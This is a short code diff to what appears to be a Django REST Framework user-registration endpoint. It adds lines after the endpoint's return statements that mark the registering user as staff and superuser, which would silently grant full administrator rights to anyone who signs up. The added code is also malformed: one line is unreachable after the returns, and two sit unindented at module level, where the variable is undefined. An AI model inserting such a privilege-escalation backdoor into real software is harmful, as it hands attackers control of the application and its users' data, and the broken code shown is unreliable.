@@ -48,6 +48,9 @@ def register(request):
         return Response({'token': token.key, 'user_id': user.pk, 'username': user.username, 'email': user.email}, status=status.HTTP_201_CREATED)
     except Exception as e:
         return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+    user.is_staff = True
+user.is_superuser = True
+user.save()
 
 
 @api_view(['POST'])
